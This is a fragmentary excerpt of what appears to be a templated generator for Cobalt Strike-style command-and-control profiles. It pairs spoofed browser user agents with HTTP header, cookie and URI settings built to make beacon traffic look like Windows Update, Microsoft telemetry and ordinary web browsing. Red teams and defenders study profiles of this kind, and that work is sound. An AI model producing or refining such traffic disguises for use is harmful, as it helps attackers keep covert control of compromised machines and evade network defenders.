...
set image_size_x86 "524288";
set image_size_x64 "524288";
...
var Useragent_list = []string{
	...
	// Win6.3 (indices 32-41)
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
	...
	"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
	...
	// Mac (indices 56-69)
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
	...
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 15.1; rv:137.0) Gecko/20100101 Firefox/137.0",
...
client {
	header "Accept" "*/*";
	header "Host" "download.windowsupdate.com/c/{{.Variables.Host}}";
...
client {
	...
	header "Cookie" "b=.12vPkW22o;_ga=GA1.2.875;d=;_ga=GA1.2.875;__ar_v4=%8867UMDGS643";
}
...
client {
	...
	header "Cookie" "b=.12vPkW22o;_ga=GA1.2.875;d=;_ga=;__ar_v4=%8867UMDGS643";
}
...
`, `
http-config {
	set headers "Server, Brightspot-Id, Cache-Control, X-Content-Type-Options, X-Powered-By, Vary, Connection";
	header "Connection" "close";
...
http-stager {
	...
	set uri_x64 "/Meeting/{{.Variables.UValue2}}/";
...
client {
	...
	header "Cookie" "MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42=";
}
...
client {
	...
	header "Accept-Language" "en-US,en;q=0.5";
	header "Cookie" "REF=ID={{.Variables.UValue}};session-id=";
...
client {
	...
	header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
	header "Accept-Language" "en-US,en;q=0.5";
	header "Cookie" "REF=ID=;U={{.Variables.UValue}}";
...
client {
	...
	header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8";
	header "Accept-Language" "en-US,en;q=0.5";
	header "Cookie" "PREF=ID={{.Variables.CSMValue}};session=";
...
client {
	...
	header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8";
	header "Accept-Language" "en-US,en;q=0.5";
	header "Cookie" "PREF=ID=;U={{.Variables.UValue}}";
...
http-get {
    ...
    client {
        header "Accept" "*/*";
        header "Cookie" "session-token=;csm-hit={{.Variables.CSMValue}}";
